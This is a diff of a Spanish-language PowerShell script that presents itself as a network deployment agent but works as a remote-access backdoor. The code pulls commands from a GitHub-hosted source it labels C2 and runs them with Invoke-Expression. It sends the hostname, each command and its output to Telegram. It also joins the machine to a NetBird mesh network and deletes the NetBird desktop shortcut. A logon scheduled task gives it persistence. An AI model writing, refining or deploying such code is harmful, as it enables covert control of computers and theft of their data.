@@ -1,6 +1,5 @@
 # ===========================================================================
-# SCRIPT DE RED CONTICS 2026 - AGENTE PRO V5
-# AUTOR: Gemino - CONTICS INFRA
+# SCRIPT DE RED CONTICS 2026 - AGENTE PRO V5.1 (FIXED C2)
 # ===========================================================================
 
 # --- [1] CONFIGURACIÓN DE RUTAS Y DATOS ---
@@ -30,23 +29,32 @@ Write-Host "`n======================================================" -Foregroun
 Write-Host "      SISTEMA DE DESPLIEGUE CONTICS 2026" -ForegroundColor Cyan
 Write-Host "======================================================" -ForegroundColor Cyan
 
-# --- [2] RECEPTOR DE TAREAS (C2) ---
-Write-Host "`n[1/4] Buscando ordenes en GitHub..." -ForegroundColor Yellow
+# --- [2] RECEPTOR DE TAREAS (C2) - VERSIÓN CORREGIDA ---
+Write-Host "`n[1/4] Buscando órdenes en GitHub..." -ForegroundColor Yellow
 try {
     $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
     if ($TareaData) {
         $Tarea = $TareaData.Content.Trim()
         if ($Tarea -ne "NONE" -and $Tarea -ne "") {
-            $null = Send-Telegram -Message "⚡ *EJECUTANDO EN:* $env:COMPUTERNAME`n`n*Orden:* `$Tarea"
+            
+            # Ejecutamos la orden y capturamos salida
             $Out = Invoke-Expression $Tarea 2>&1 | Out-String
-            $null = Send-Telegram -Message "✅ *RESULTADO:*`n$Out"
-            Write-Host " [+] Comando ejecutado con exito." -ForegroundColor Green
+            
+            # Construimos un ÚNICO mensaje para evitar spam y errores
+            $Cuerpo = "⚡ *EJECUCIÓN COMPLETADA*`n" +
+                      "💻 *PC:* ``$env:COMPUTERNAME`` `n" +
+                      "📜 *Orden:* ``$Tarea`` `n" +
+                      "📊 *Resultado:*`n`n" +
+                      "````n" + $Out + "```"
+            
+            $null = Send-Telegram -Message $Cuerpo
+            Write-Host " [+] Orden '$Tarea' procesada." -ForegroundColor Green
         } else {
-            Write-Host " [+] Sin ordenes pendientes." -ForegroundColor Gray
+            Write-Host " [+] Sin órdenes pendientes." -ForegroundColor Gray
         }
     }
 } catch {
-    Write-Host " [-] Error al leer tareas." -ForegroundColor Red
+    Write-Host " [-] Error al procesar tarea." -ForegroundColor Red
 }
 
 # --- [3] LÓGICA DE RED (NETBIRD) ---
@@ -63,19 +71,18 @@ if (!(Test-Path $nbPath)) {
 & $nbPath down | Out-Null
 & $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null
 
-# Limpieza de iconos
 if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
 
-# --- [4] REPORTE ESTÉTICO ---
+# --- [4] REPORTE DE NODO ---
 Write-Host "[3/4] Generando reporte de nodo..." -ForegroundColor Yellow
-Start-Sleep -Seconds 8
+Start-Sleep -Seconds 10
 $status = & $nbPath status
 $lineaIP = $status | Select-String 'NetBird IP:'
 
 if ($lineaIP) {
     $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
-    $Msg = "*[OK] NODO CONECTADO*`n`n*Equipo:* $env:COMPUTERNAME`n*IP:* $nbIP"
-    $sent = Send-Telegram -Message $Msg
+    $Msg = "*[OK] NODO CONECTADO*`n`n*PC:* ``$env:COMPUTERNAME`` `n*IP:* ``$nbIP``"
+    $null = Send-Telegram -Message $Msg
     
     Write-Host "`n [+] ESTATUS:      " -NoNewline; Write-Host "CONECTADO" -ForegroundColor Green
     Write-Host " [+] IP ASIGNADA:  " -NoNewline; Write-Host "$nbIP" -ForegroundColor Yellow
@@ -98,10 +105,9 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Se
 
 Write-Host " [+] PERSISTENCIA:  " -NoNewline; Write-Host "ACTIVA (LogOn)" -ForegroundColor Green
 Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
-Write-Host "Abriendo panel de gestion..." -ForegroundColor Gray
+Write-Host "Abriendo panel de gestión..." -ForegroundColor Gray
 
-# Abre la página que te gusta
 Start-Process $mUrl 
 
-Write-Host "`nProceso completado. Sistema CONTICS en linea." -ForegroundColor White
-Start-Sleep -Seconds 2
+Write-Host "`nProceso completado. Sistema CONTICS en línea." -ForegroundColor White
+Start-Sleep -Seconds 3
